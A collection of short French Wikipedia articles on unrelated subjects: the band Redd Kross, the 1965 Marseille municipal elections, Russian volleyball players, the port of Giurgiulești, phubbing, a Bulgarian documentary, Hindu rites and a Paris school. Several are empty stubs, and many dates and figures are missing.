<doc id="7900279" url="https://fr.wikipedia.org/wiki?curid=7900279" title="Redd Kross">
Redd Kross

Redd Kross est un groupe de rock américain fondé en 1980 par Jef et Steven McDonald. Le groupe alterne les périodes d'activités et de sommeil depuis 35 ans avec une rotation de personnel autour de Jeff et Steve. Le groupe atteindra plusieurs fois de suite les UK Singles Chart.
Biographie.
Le groupe est un avatar d'un groupe précédent : The Tourists, alors qu'ils étaient au collège. Ils sont rejoints par Ron Reyes et Greg Hetson (futurs membres de Bad Religion). D'abord dénommés Red Cross en référence à la scène de masturbation de "L'Exorciste", le groupe essuya une menace de procès de la croix rouge et changea son nom en Redd Kross. Leur premier album ' sort, grâce à la tutelle bienveillante de Black Flag, au label Frontier Records en 1982. Il suivra de ', un album de reprises, distribué par Gasatanka Records en 1984.
', sorti en 1987 et produit par Tommy Ramone (Tommy Erdelyi) sur Big Time Records sera leur premier disque à vraiment les faire connaitre en plein essor grunge. Suivront le très pop ' sur Atlantic Records en 1990, ' en 1993, et ' sur Universal Records en 1997. S'en suivra une longue période d'inactivité de 15 ans avant que le groupe ne sorte " en 2012.
Influence.
Si le groupe reste peu connu en dehors des États-Unis et même du très grand public là-bas, il jouit d'un groupe de fervents adeptes chez des musiciens connus comme Slash, Sonic Youth, Black Flag, Kurt Cobain ou encore The Meat Puppets

</doc>
<doc id="7900281" url="https://fr.wikipedia.org/wiki?curid=7900281" title="Élections municipales de 1965 à Marseille">
Élections municipales de 1965 à Marseille

Des élections municipales ont lieu à Marseille les 14 et .
Gaston Defferre, maire de Marseille depuis 1953, est réélu pour un troisième mandat à la tête d'une majorité qui allie socialistes, radicaux et droite non-gaulliste face à Daniel Matalon, candidat de l'« Union des forces démocratiques » qui regroupe des dissidents de la SFIO et le PCF, et Joseph Comiti, gaulliste.
C'est lors de cette élection que Jean-Claude Gaudin — maire LR de 1995 à 2020 — est élu pour la première fois au conseil municipal, sur la liste de Gaston Defferre.
Mode de scrutin.
En 1965, les conseillers municipaux au scrutin de liste majoritaire dans le cadre de huit secteurs : la liste gagnante remporte la totalité des sièges du secteur. Pour l'emporter, une liste doit recueillir la majorité absolue des suffrages exprimés au premier tour ou la majorité relative au second.
Candidats.
Gaston Defferre.
Gaston Defferre est maire de Marseille depuis 1953, à la tête d'une coalition qui regroupe tous les partis sauf le Parti communiste qui est reconduite en 1959. Il se représente en 1965 alors qu'il tente en même temps d'obtenir l'investiture de la SFIO pour l'élection présidentielle avec un programme d'ouverture au centre.
Toutefois, sa majorité se fissure avant les élections : une partie des socialistes décide de s'allier au PCF alors que certains élus de droite de la majorité rallie le candidat de l'UNR. Les listes de Gaston Defferre, , comptent finalement des candidats de la SFIO et des modérés, des radicaux et des MRP.
Daniel Matalon.
Une minorité de la SFIO, conduite par Daniel Matalon et Marius Massias, refuse l'alliance à droite de Gaston Defferre. Ils ne peuvent le mettre en minorité au sein du parti mais décide toutefois de s'allier au PCF. Des listes d' sont constituées, avec des socialistes, des communistes et des . Elles sont conduites par Daniel Matalon, candidat à la mairie.
Joseph Comiti.
Le parti gaulliste UNR tente depuis le début des années 1960 de concurrencer Gaston Defferre à Marseille, sans toutefois y parvenir. Son candidat, Joseph Comiti, rassemble sur les listes des gaullistes, des indépendants et quelques anciens socialistes.
Autres listes.
Une liste gaulliste dissidente se présente dans le secteur et le Luccioni mène une liste d'extrême droite proche des thèmes de l'.
Résultats.
Au premier tour, les listes de Gaston Defferre et de Daniel Matalon sont au coude à coude, la liste soutenue par ce dernier parvenant même à gagner au premier tour le secteur, bastion communiste. Les listes de l'UNR réalisent un meilleur score que lors des précédentes élections mais ne sont en mesure de gagner dans aucun secteur. Malgré l'appel national de l'UNR au barrage anti-communiste, Joseph Comiti maintient ses listes au second tour alors que les listes Luccioni ne se maintiennent que dans le secteur.
Dans l'entre-deux-tours, Gaston Defferre fait campagne à droite, contre le PCF. Il parvient finalement à l'emporter dans quatre secteurs, ce qui lui permet de disposer d'une majorité de sur 63 au conseil municipal.

</doc>
<doc id="7900282" url="https://fr.wikipedia.org/wiki?curid=7900282" title="Mikhail Stepanovich Tkatchenko">
Mikhail Stepanovich Tkatchenko



</doc>
<doc id="7900286" url="https://fr.wikipedia.org/wiki?curid=7900286" title="Bleu-ciel informatique">
Bleu-ciel informatique

Bleu-ciel informatique, était une SARL de trois personnes créée en située dans le département de l'Ardèche à Guilherand. En elle était le dernier éditeur français à sortir des logiciels pour l'Oric.
Histoire.
Bleu-ciel informatique a été créée en à Guilherand en Ardèche.
En , bleu-ciel informatique était le dernier éditeur français à sortir des logiciels pour l'Oric.
La société non dissoute mais sans activité a été radiée d'office le par le greffe du tribunal de commerce d'Aubenas.
Activité.
Son activité était tournée vers :

</doc>
<doc id="7900292" url="https://fr.wikipedia.org/wiki?curid=7900292" title="Vadym Likhosherstov">
Vadym Likhosherstov

Vadym Viktorovytch Likhocherstov (en ) est un joueur ukrainien de volley-ball né le à Kharkiv (RSS d'Ukraine). Il mesure et joue central. Il est international ukrainien.

</doc>
<doc id="7900294" url="https://fr.wikipedia.org/wiki?curid=7900294" title="Clément-Bollée">
Clément-Bollée

Clément-Bollée peut désigner :

</doc>
<doc id="7900312" url="https://fr.wikipedia.org/wiki?curid=7900312" title="Alekseï Karpenko">
Alekseï Karpenko

Alekseï Karpenko (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900330" url="https://fr.wikipedia.org/wiki?curid=7900330" title="Iouri Fomine">
Iouri Fomine

Iouri Fomine (en ) est un joueur russe de volley-ball né en 1982. Il mesure et joue libero.
Palmarès.
Néant.

</doc>
<doc id="7900331" url="https://fr.wikipedia.org/wiki?curid=7900331" title="Liste des universités à Pékin">
Liste des universités à Pékin

Liste des universités se trouvant dans la municipalité de Pékin, en république populaire de Chine.

</doc>
<doc id="7900333" url="https://fr.wikipedia.org/wiki?curid=7900333" title="FCR 2001 Duisbourg">
FCR 2001 Duisbourg



</doc>
<doc id="7900335" url="https://fr.wikipedia.org/wiki?curid=7900335" title="Angelo Ingegneri">
Angelo Ingegneri

Angelo Ingegneri (Venise, - Venise, ) est un poète italien, il a également écrit en .
Biographie.
Il est né à Venise dans une ancienne famille originaire de Burano et vivant à Bragora, on n'a pas d'informations sur sa jeunesse. En 1573, il traduit "Remedia amoris" d'Ovide, qui sera imprimé à Avignon en 1576 avec une dédicace au comte Conte Marcantonio Martinengo di Villachiara.

</doc>
<doc id="7900337" url="https://fr.wikipedia.org/wiki?curid=7900337" title="Port de Giurgiulești">
Port de Giurgiulești

Le port de Giurgiulești, , en français : « port franc international de Giurgiulești », est le seul port marchand et de passagers de Moldavie, situé à l'extrémité méridionale du pays, à la confluence du Prut et du Danube. Il combine des terminaux pétrolier et céréalier, une gare maritime, et peut, compte tenu de la profondeur du Danube, accueillir des navires maritimes.
Construction.
En 1995, le gouvernement moldave a créé la société "Terminal S.A.", une coentreprise à participation grecque pour l’aménagement d’un port et d’une raffinerie de pétrole à l’est de Giurgiulești. Ce port a été vivement contesté pour quatre raisons :
Le gouvernement moldave n’en eut cure et en 1996, la BERD lui a octroyé un crédit de plus de 19 millions de dollars et détient de ce fait 20 % de la société. 41 % sont détenus par la société moldave "Tirex-Petrol" et 39 % par la société grecque "Technovax". Les travaux ont débuté en mais les contestations se sont avérées réalistes et le gouvernement moldave a du vendre sa part en 2003. C’est pourquoi l’ouverture du port a été graduelle : le pour le terminal pétrolier, le pour la gare maritime et le pour le terminal céréalier .
Trafic.
En fin de compte même si le port est moldave, le gouvernement ne le contrôle pas plus que s’il était étranger, puisque des actionnaires russes, grecs et azerbaïdjanais y sont majoritaires. Le trafic de fret reste très épisodique, d’autant qu’en période hivernale le port est englacé ; quant au trafic voyageurs, il est assuré l’été par quelques navettes fluviales roumaines de la ligne Galați-Tulcea-Sulina (toutes n’y abordent pas) et, jusqu’à l’invasion de l'Ukraine par la Russie en 2022, par le paquebot "Princessa Elena" dont l’équipage était moldave, l’affréteur russe (une compagnie de Sotchi) et le pavillon libérien : il reliait Giurgiulești à Istanbul en 18 heures certaines semaines de mai à août. 

</doc>
<doc id="7900342" url="https://fr.wikipedia.org/wiki?curid=7900342" title="Port de Giurgiulesti">
Port de Giurgiulesti



</doc>
<doc id="7900351" url="https://fr.wikipedia.org/wiki?curid=7900351" title="Portul Internațional Liber Giurgiulești">
Portul Internațional Liber Giurgiulești



</doc>
<doc id="7900358" url="https://fr.wikipedia.org/wiki?curid=7900358" title="André Caillet (footballeur)">
André Caillet (footballeur)



</doc>
<doc id="7900360" url="https://fr.wikipedia.org/wiki?curid=7900360" title="Amadis (Tasso)">
Amadis (Tasso)



</doc>
<doc id="7900361" url="https://fr.wikipedia.org/wiki?curid=7900361" title="Sergueï Nikitine (volley-ball, 1993)">
Sergueï Nikitine (volley-ball, 1993)

Sergueï Nikitine (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7900375" url="https://fr.wikipedia.org/wiki?curid=7900375" title="Annegret Brießmann">
Annegret Brießmann

Annegret Brießmann (née le ) est une joueuse allemande de handibasket, membre du club . Elle a également participé aux jeux paralympiques d'été de 2012 de Londres, durant lesquels elle remportera une médaille d'or. Le président fédéral Joachim Gauck a attribué à son équipe la plus haute distinction qu'est la médaille "Silbernes Lorbeerblatt".
Biographie.
Annegret Brießmann est née à Ober-Beerbach le . Elle vit désormais à Einhausen. Adolescente, elle s'inscrit au club SKG Ober-Beerbach Fußball dans lequel elle participe à des matchs de football. Elle participe également à des matchs de basketball pendant plusieurs années dans une équipe locale appelée BSC Einhausen, puis à des événements d'athlétisme au TSV Eschollbrücken.
En 2005, Brießmann, victime d'un accident de ski, souffre d'une fracture vertébrale qui la rendra paraplégique. Elle retourne dans le domaine de l'athlétisme et remporte le championnat national allemand du lancer de poids avec un lancer de . Einhausen la nomme sportive de l'année 2009. Brießmann s'intéresse par la suite à la discipline du handibasket pendant sa rééducation. Elle est placée au plus haut niveau de handicap en matière sportif. Elle joue à Darmstadt et Aschaffenbourg avant de se joindre au de Francfort en 2010.

</doc>
<doc id="7900389" url="https://fr.wikipedia.org/wiki?curid=7900389" title="Area 51">
Area 51

Area 51 peut désigner :

</doc>
<doc id="7900392" url="https://fr.wikipedia.org/wiki?curid=7900392" title="Phubbing">
Phubbing

Le , mot-valise anglais formé à partir de ' (« téléphone ») et de ' (« snober, ignorer ») et qui peut se traduire par « télésnober », est l'acte d'ignorer des personnes physiquement présentes en consultant son téléphone plutôt que de communiquer avec elles. Celui qui se comporte de la sorte est appelé un phubber.
Historique.
Le terme " est lancé le par l'agence McCann pour promouvoir la dernière édition du dictionnaire d'anglais-australien de , l'agence invitant à cette occasion un groupe d'universitaires de l'université de Sydney (lexicographe, phonéticien, cruciverbiste, poète, auteurs) à créer ce néologisme.
Ce comportement antisocial des " s'est développé avec l'avènement du smartphone, particulièrement dans les pays développés. Au Royaume-Uni où un sondage réalisé en 2013 par la société d'étude de marché YouGov révèle que 54 % des Britanniques déclarent consulter Facebook, Twitter ou d'autres réseaux sociaux tous les jours, 16 % le consultant plus de dix fois par jour et 63 % portant leur téléphone sur eux « presque tout le temps, ou tout le temps ». Un tiers d'entre eux reconnaît être des phubbers, 27 % d'entre eux répondant à un appel téléphonique pendant une conversation en face à face, 30 % en étant au restaurant et 19 % lorsqu'ils sont servis dans un magasin. Selon un sondage Ifop en 2013, 42 % des Français se considèrent nomophobes, 24 % des possesseurs de smartphone le consultent plusieurs fois par heure.
Afin de diffuser le terme, un responsable de la publicité de l'agence McCann, Alex Haigh, lance en 2013 le site stopphubbing.com. D'autres formes de résistance anti-phubbing se manifestent, comme le ', « empilement de téléphones » au milieu de la table (si l'un des convives vérifie ses appels pendant le repas, il paie l'addition entière) ; chopes de bière « ' » conçues dans un bar à Sao Paulo au Brésil et dotées d'une fente à sa base qui ne se redresse que lorsque le smartphone est posé sur la table ; un restaurant de Los Angeles offre une ristourne de 5 % à ses clients qui acceptent de laisser leur portable à l’entrée ; création en France par le directeur d'agence publicitaire Guillaume Villemot de la « Journée Nationale de la Conversation » accompagnée d’un « festival des Conversations ».

</doc>
<doc id="7900415" url="https://fr.wikipedia.org/wiki?curid=7900415" title="Lars Bylund">
Lars Bylund

Lars Bylund, né le à Gävle en Suède et mort le 3 novembre 2021, est un joueur professionnel suédois de hockey sur glace qui évoluait en position de défenseur.

</doc>
<doc id="7900427" url="https://fr.wikipedia.org/wiki?curid=7900427" title="Grand Prix d'été de combiné nordique 2014">
Grand Prix d'été de combiné nordique 2014

Le Grand Prix d'été de combiné nordique 2014 est la dix-septième édition de la compétition estivale de combiné nordique. La compétition a été remportée par le coureur allemand Johannes Rydzek, qui avait déjà remporté cette compétition en 2010 et 2011 et il a réalisé l'exploit de remporter chacune des épreuves de cette édition.
Elle s'est déroulée à la fin du mois d', en cinq épreuves disputées sur trois sites différents. Les épreuves ont commencé en Allemagne, à Oberwiesenthal, près de la frontière tchèque, se sont poursuivies en Autriche, à Villach, avant que de s'achever en Allemagne, en Bavière cette fois, à Oberstdorf.
En marge des courses d'Oberstdorf, des courses de jeunes filles ont été organisées pour la première fois.
Organisation de la compétition.
Programme et sites de compétition.
Cette dernière étape a également donné lieu à des compétitions de minimes, dont des épreuves féminines. Ce sont les premières épreuves féminines internationales jamais organisées. 9 pays et 40 compétitrices y participaient.
Dotation financière.
Les organisateurs de chaque course doivent consacrer € au . La distribution est la suivante : € pour le classement de la course (les six premiers de l'individuel et les six premières équipes du ).
Les € restant sont consacrés à la dotation du classement général qui est distribué aux trois premiers de ce classement. Le vainqueur touche €, le deuxième € et le troisième €.
Compétition.
Avant la compétition.
Athlètes pouvant participer.
Les nations qui le souhaitent peuvent engager un nombre limité d'athlètes par compétition:
La nation peut engager quatre athlètes supplémentaires.
Sont sélectionnables, les athlètes ayant :
Participants.
La compétition rassemble les meilleurs athlètes mondiaux. Les Français, absents en 2013 viennent avec leurs meilleurs athlètes sauf Sébastien Lacroix qui déclare forfait en raison de la naissance de son fils.
Déroulement de la compétition.
Oberwiesenthal.
Les Allemands, Eric Frenzel et Johannes Rydzek dominent facilement le sprint par équipes.
Classements finaux.
Coupe des Nations.
Le classement de la Coupe des nations est établi à partir d'un calcul qui fait la somme de tous les résultats obtenus par les athlètes d'un pays dans les épreuves individuelles ainsi que les deux meilleurs résultats du sprint par équipes. Une équipe du pays en tête de ce classement s'élancera en dernier lors du saut de l'épreuve par équipes.
Résultats.
Résultats détaillés par athlète.
Le tableau suivant récapitule les places obtenus par les athlètes engagés dans les quatre épreuves individuelles.

</doc>
<doc id="7900435" url="https://fr.wikipedia.org/wiki?curid=7900435" title="Ferdinand Duchêne">
Ferdinand Duchêne

Ferdinand Duchêne, né à Bussière-Poitevine le et mort à Arcachon le , est un magistrat et écrivain français.
Biographie.
Nommé en 1895 juge de paix suppléant à Dellys, Ferdinand Duchêne mène une carrière de magistrat en Algérie qui le fait séjourner dans diverses villes avant d'occuper de 1921 à 1932, la fonction importante de conseiller à la cour d'Alger.
À ce poste, il attache son nom à la réforme du statut juridique de la femme kabyle. Ferdinand Duchêne, qui a appris l'arabe et le kabyle est l'auteur d'une douzaine de romans algériens dont la plupart sont regroupés dans le cycle "Les Barbaresques".

</doc>
<doc id="7900443" url="https://fr.wikipedia.org/wiki?curid=7900443" title="Liste des ministres sud-africains du Développement rural et de la réforme agraire">
Liste des ministres sud-africains du Développement rural et de la réforme agraire

Les ministres du développement rural et de la réforme agraire , autrefois ministres des terres d'Afrique du Sud et ministres des affaires foncières sont compétents pour tous les sujets relevant de la cartographie topographique, de la répartition foncière, de l'enregistrement des actes de propriété foncier et des réformes agraires.
Ce ministère a été à l'origine de la loi sur les parcs nationaux (1926) qui fondait le réseau des parcs nationaux d'Afrique du Sud.
Il a parfois été associé au département ministériel de l'agriculture, notamment de 1996 à 2009.
En 2009, le ministère des affaires foncières est devenu le ministère du développement rural et de la réforme agraire. Le , il est fusionné avec le ministère de l'agriculture dans le second gouvernement Ramaphosa.
Liste des ministres sud-africains des terres.
En 1968, le ministère des terres et des affaires foncières est intégré dans celui de l'agriculture.
Il réapparait sous le gouvernement PW Botha en 1986 en tant que ministère des affaires foncières.

</doc>
<doc id="7900446" url="https://fr.wikipedia.org/wiki?curid=7900446" title="La Dernière Ambulance de Sofia">
La Dernière Ambulance de Sofia

La Dernière Ambulance de Sofia (, "Poslednata Lineyka na Sofiya") est un long métrage documentaire bulgare, coproduit avec l'Allemagne et la Croatie, réalisé par le réalisateur bulgare Ilian Metev, sorti en 2012. 
La première du film était à la Semaine internationale de la critique au Festival de Cannes en 2012, où il a reçu la France 4 Prix Révélation. C'était le deuxième documentaire à concourir dans 51 années de l'histoire de la section.
Synopsis.
"La Dernière Ambulance de Sofia" commence avec une journée ordinaire de Krassi, Mila et Plamen, l'équipage ambulancier sur une de la flotte d'ambulances d'urgence qui diminue dangereusement a Sofia. L'infrastructure médicale est en ruines et les services de l'ambulance sont une des plus difficiles. Bientôt la pression quotidienne de l'équipe est révélé dans une séquence d'absurdités. Inhabituel pour un film au sujet de services médicaux, les patients sont restés à l'extérieur du cadre avec tact et le sensationnalisme a été rigoureusement évitée. Les travaux de la caméra sont concentrés étroitement sur les visages de l'équipage de l'ambulance pour saisir les changements dans leur état d'esprit dans leurs efforts persistants de travailler malgré l'absence de moyens, l'épuisement et la bureaucratie.
Production.
La recherche pour "La Dernière Ambulance de Sofia" commencé en 2008. Pendant la période de recherche, Metev rencontré Dr Yordanov, qui a travaillé dans les services d'urgence depuis 23 ans, et a été fasciné par son humilité. Dr Yordanov et son deux coéquipiers étaient responsables pour les cas les plus critiques de la capitale. Le documentaire observationnelle a été ensuite tiré sur la période de deux ans , avec l'équipe de tournage composée de Metev et le enregistreur du son Tom Kirk placé à l'arrière de l'ambulance, en essayant d'être le plus discret et invisible possible .
Le film a été co-produit en association avec la chaîne allemande de télévision WDR, la chaîne allemand / français Arte, le fonds d'investissement américain impact Partenaires, le Centre National du Film bulgare, le Centre Audiovisuel croate et l'allemand Film und Medienstiftung NRW. Les agents de vente sont Films Boutique basé à Berlin.
Impact social.
À la première du film à Sofia, le ministre de la santé bulgare Desislava Atanasova a admis que ""La Dernière Ambulance de Sofia" reflète la réalité des choses" et prononcé que depuis le film, deux nouvelles unités d'intervention d'urgence ont été ouverts dans la capitale pour accélérer le temps de réponse; les salaires des équipages ambulanciers devaient être augmentés de 18%. Protagoniste et médecin d'urgence Krassimir Yordanov critiqué le fait que ces réformes étaient insuffisantes pour répondre à la véritable cause des problèmes: chroniquement petits salaires qui rend les professionnels de la santé quittent en masse. Malgré d'avoir 25 ans d'expérience dans le travail, son salaire mensuel est "inférieure à la rémunération hebdomadaire d'un collègue dans d'autres pays de l'Union européenne" .
Accueil.
"La Dernière Ambulance de Sofia" a présenté en avant-première à la 51e Semaine Internationale de la Critique à Cannes. L'AFP a écrit que «après la projection, les réalisateurs et les acteurs étaient en larmes. Nombre de spectateurs aussi" . Jay Weissberg de Variety décrit le film comme "rigide construit et profondément humain" et Julien Gester de Libération a l'appelait une «enquête fine et forte d'un état de crise."

</doc>
<doc id="7900449" url="https://fr.wikipedia.org/wiki?curid=7900449" title="Martial Mazurier">
Martial Mazurier

François Martial Mazurier ou Masurier est un prédicateur français du . Né à Limoges, il est décédé le à Paris.
Biographie.
Docteur en Sorbonne (1514), principal du collège de St-Michel à Paris, membre du cénacle de Meaux, chanoine et pénitencier de l'église de Paris, il fut un des prédicateurs les plus connus du . Accusé de faux prêches et d'avoir commis des actes de violence, il est emprisonné à la Conciergerie. Menacé du bucher, il se rétracte et enseigne finalement l'inverse de ses anciennes prêches. Il se lie alors avec Ignace de Loyola et devient un des plus farouches défenseurs des causes papales.

</doc>
<doc id="7900450" url="https://fr.wikipedia.org/wiki?curid=7900450" title="Ilia Parkhomtchouk">
Ilia Parkhomtchouk

Ilia Parkhomtchouk (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.

</doc>
<doc id="7900462" url="https://fr.wikipedia.org/wiki?curid=7900462" title="Boule de neige">
Boule de neige

Une boule de neige est un amas de neige confectionné dans un but généralement ludique, dans le cadre d'une bataille de boules de neige ou de la création d'un bonhomme de neige par exemple. Une boule de neige est généralement débutée en amassant de petites quantités de neige dans les mains. Cette masse peut ensuite être roulée sur de la neige au sol pour augmenter son volume par agrégation.
Le fraisage de la couche superficielle des pistes de ski par les dameuses peut aboutir à la formation de petites boulettes de neige dures.

</doc>
<doc id="7900463" url="https://fr.wikipedia.org/wiki?curid=7900463" title="Marek Sowa">
Marek Sowa

Marek Jan Sowa (né le à Libiąż (district de Chrzanów), dans la voïvodie de Petite-Pologne) est une personnalité politique polonaise.
Biographie.
Marek Sowa a commencé à travailler aussitôt après sa scolarité au lycée technique d'Oświęcim. En 1990, il part pendant 18 mois en Finlande et crée à son retour sa propre entreprise. En 1994, il est élu au conseil municipal de la commune de Chełmek, et est choisi comme maire-délégué (sołtys) du village de Bobrek. 
Il entreprend parallèlement en 1996 des études de gestion (licence à l' puis diplôme de master en 2003 de la faculté de management de l'École des mines de Cracovie).
Après la réforme de décentralisation de 1999, Marek Sowa travaille pour la collectivité territoriale de Petite-Pologne et devient rapidement directeur général adjoint des services, recruté par Janusz Sepioł devenu maréchal de la voïvodie. En 2006, il est élu (sur la liste de la Plateforme civique (PO) à la diétine de la voïvodie (assemblée régionale). 
Réélu en 2010, il devient maréchal de la voïvodie (chef de l'exécutif régional). 
Il s’attelle à renforcer la coopération internationale décentralisée, par exemple avec la région française Rhône-Alpes. 
Élu député lors des élections parlementaires de 2015, il démissionne aussitôt de la direction de la région et Jacek Krupa est élu pour lui succéder au poste de maréchal.

</doc>
<doc id="7900470" url="https://fr.wikipedia.org/wiki?curid=7900470" title="Anton Anossov">
Anton Anossov

Anton Viatcheslavovitch Anossov (en ) est un joueur russe de volley-ball né le . Il mesure et joue libero.
Palmarès.
Néant.

</doc>
<doc id="7900489" url="https://fr.wikipedia.org/wiki?curid=7900489" title="Alex Bentley">
Alex Bentley

Alex Bentley est une joueuse de basket-ball américaine, naturalisée biélorusse, née le à Indianapolis (Indiana).
Biographie.
Au lycée.
Elle emmène la à un record de 33 victoires pour aucun revers en senior grâce à ses 15,7 points, 2,6 passes décisives, 2,2 interceptions et 3,2 rebonds. Elle est intégrée au troisième cinq des All-American du Parade Magazine High School.
Carrière universitaire.
Avec Nittany Lions de Penn State, elle est la quatrième joueuse de la Big Ten (dont Katie Smith et Tamara Moore) à cumuler au moins , décisives et . En senior, elle affiche , , et (sixième total national). Elle est un des sept finalistes du Nancy Lieberman Award de la meilleure meneuse du pays et remporte le Frances Pomeroy Naismith Award, qui récompense la meilleure joueuse d'1,73 m. Meilleure interceptrice du pays dans son année junior, ses volées sont le second meilleur total de Penn State.
WNBA.
Treizième choix de la draft 2013, elle intègre le cinq des meilleures rookies de la saison (troisième aux passes avec 2,8 et aux interceptions avec 1,0 et quatrième au scoring avec 8,3). Entre le 14 et le , elle établit un nouveau record WNBA de dix paniers à trois points réussis consécutivement. Avec face aux Sparks le , elle égale le record de passes décisives de la franchise.
Le , elle est transférée aux Mystics de Washington avec un troisième tour de draft 2014 contre Matee Ajavon et un second tour de draft 2014, puis est de nouveau échangée le même jour avec Sun du Connecticut pour Kara Lawson. Lors de sa seconde saison, elle établit le un nouveau record de points en carrière avec face au Liberty de New York.
Le , elle est nommée pour la première fois joueuse de la semaine de la Conférence Est pour son importante contribution à une série de trois victoires consécutives du Sun.
Elle est nommée pour le WNBA All-Star Game 2015. Le , elle inscrit 31 points, son nouveau record en carrière, pour aider à la victoire du Sun 86 à 72 face à des Mystics qui restaient sur sept victoires consécutives
Le , elle inscrit 29 points avec 11 tirs réussis sur 16 face aux Stars de San Antonio.
Le , Layshia Clarendon est échangée avec un second tour de la draft WNBA 2019 par le Dream contre Alex Bentley et envoyée au Sun quelques jours après avoir été impliquée dans une altercation avec sa coéquipière Courtney Williams. Après une série de trois succès avec la franchise d'Atlanta, elle commente : En effet, l'entraîneuse du Dream Nicki Collen était l'année précédente assistante au Sun.
En juin 2020, elle rejoint les Aces de Las Vegas mais est renvoyée avant le début de la saison.
Étranger.
En 2014, elle est finaliste du championnat du Brésil avec Sport Recife pour des statistiques de avec 48,9 % d'adresse à deux points, et de moyenne. Avant le début de sa seconde saison WNBA, elle s'engage pour le club français de Tarbes Gespe Bigorre.
Pour 2017-2018, elle joue en Russie avec Nadejda Orenbourg.
En 2019-2020, elle évolue avec l’équipe turque de Cukurova Basketbol, pour des moyennes de 15,4 points et 5 passes décisives en Ligue et 10,3 points et 3,9 rebonds en Euroligue.
Equipe nationale.
Naturalisée biélorusse, elle figure dans la présélection devant disputer le Championnat d'Europe 2019.

</doc>
<doc id="7900492" url="https://fr.wikipedia.org/wiki?curid=7900492" title="Iaroslav Podlesnikh">
Iaroslav Podlesnikh

Iaroslav Igorievitch Podlesnikh (en ) est un joueur russe de volley-ball né le . Il mesure et joue passeur.
Palmarès.
Néant.

</doc>
<doc id="7900496" url="https://fr.wikipedia.org/wiki?curid=7900496" title="Karnavedha">
Karnavedha

Le Karnavedha (sanskrit: कर्णवेध) est un rite de l'hindouisme, un samskara. Il consiste à percer les oreilles de son enfant. Si dans l'antiquité cette tradition pouvait s'effectuer sur les enfants garçons et filles, de nos jours il est plus courant de voir cette cérémonie faite sur les filles uniquement. Le symbole est le fait d'ouvrir les oreilles au monde. L'histoire de l'hindouisme a créé des critères de qualités de bijoux (or, argent) à suivre suivant la caste à laquelle l'enfant appartient. Elle raconte aussi que des boucles d'oreilles peuvent apporter la protection face aux maux.

</doc>
<doc id="7900515" url="https://fr.wikipedia.org/wiki?curid=7900515" title="Hurricane Katrina">
Hurricane Katrina



</doc>
<doc id="7900524" url="https://fr.wikipedia.org/wiki?curid=7900524" title="Sowa">
Sowa



</doc>
<doc id="7900531" url="https://fr.wikipedia.org/wiki?curid=7900531" title="Romanas Chkouliavitchous">
Romanas Chkouliavitchous

Romanas Chkouliavitchous (en ) est un joueur russe de volley-ball né le à Biržai. Il mesure et joue attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900533" url="https://fr.wikipedia.org/wiki?curid=7900533" title="Les Contes de la crypte (bande dessinée)">
Les Contes de la crypte (bande dessinée)



</doc>
<doc id="7900535" url="https://fr.wikipedia.org/wiki?curid=7900535" title="Leptobrachium masatakasatoi">
Leptobrachium masatakasatoi

Leptobrachium masatakasatoi est une espèce d'amphibiens de la famille des Megophryidae.
Répartition.
Cette espèce est endémique de la province de Houaphan au Laos. Elle se rencontre à environ d'altitude.
Étymologie.
Cette espèce est nommée en l'honneur de Masataka Sato.

</doc>
<doc id="7900537" url="https://fr.wikipedia.org/wiki?curid=7900537" title="Vidyarambha">
Vidyarambha

Le Vidyarambha est un samskara de l'hindouisme: un rituel de passage; celui-ci marque le début des études par l'apprentissage de l'alphabet. Vidya signifie: "connaissance" et arambha "commencement". Cette journée se nomme aussi: "akshararambha", ou, "aksharalekhana". Cette cérémonie veut dans sa pensée donner l'alphabet à l'enfant pour qu'il puisse étudier. Elle a lieu entre sa cinquième et septième année de vie. Il est dans la tradition que le nouvel élève rédige un mantra en première écriture, à Ganesh et Vishnu par exemple. Le jour de ce rituel ne doit pas être choisi au hasard mais lorsque le soleil, l'éveilleur des consciences, brille fortement.

</doc>
<doc id="7900548" url="https://fr.wikipedia.org/wiki?curid=7900548" title="Établissement Gerson">
Établissement Gerson

L’établissement scolaire catholique privé Gerson (école, collège, lycée) sous contrat d'association avec l'État est situé au , rue de la Pompe à Paris dans le de Paris. Il a été fondé en 1884 par l'abbé Dibildos.
En 2021, cet établissement compte près de 1600 élèves, répartis sur 52 classes de la maternelle à la terminale.
Histoire.
Édouard-Hippolyte-Marie Dibildos naît le à Valladolid en Espagne, de parents basques. En 1882, il prépare la fondation de Gerson, qui ouvre en 1884. C'est le quatrième externat de lycéens ; il porte le nom de Jean de Gerson, prédicateur, philosophe, homme politique, enseignant et théologien français du Moyen Âge, chancelier de Notre-Dame et de l'Université de 1395 à 1415. Les précédents externats portent les noms de Bossuet, Fénelon et Ozanam. Ce choix d'intellectuels connus à la fois pour leur intelligence et pour leur vie religieuse visait à ne pas imposer aux lycées une institution trop ouvertement cléricale.
Historiquement établissement de garçons, Gerson devient mixte à la fin des années 1980.
À partir de 2013, sous la présidence et la direction de Guy Grosse et de Philippe Person, le bâtiment du lycée est réhabilité dans son ensemble.
Classement du lycée.
En 2015, le lycée se classe sur 109 au niveau départemental quant à la qualité d'enseignement, et au niveau national. Le classement s'établit sur trois critères : le taux de réussite au bac, la proportion d'élèves de première qui obtient le baccalauréat en ayant fait les deux dernières années de leur scolarité dans l'établissement, et la "valeur ajoutée" (calculée à partir de l'origine sociale des élèves, de leur âge et de leurs résultats au diplôme national du brevet).
Projet pédagogique.
L'établissement Gerson accueille des enfants intellectuellement précoces (EIP) depuis 1995 notamment dans des classes spécifiques au collège. Le parcours est individualisé :
L'établissement attache de l'importance aux langues vivantes et aux langues anciennes : enseignement du latin et de l'anglais option européenne (cours d'histoire dispensés en anglais).
Le "First Certificate of Cambridge" est proposé afin d’obtenir un diplôme délivré par l’université de Cambridge validant un niveau B2.
Pour encourager les élèves de à progresser en anglais et en allemand, Gerson a proposé une préparation aux examens PET de Cambridge et B2 de l’Institut Goethe.
Pour les élèves volontaires, il est également proposé de suivre les formations suivantes :
Polémique.
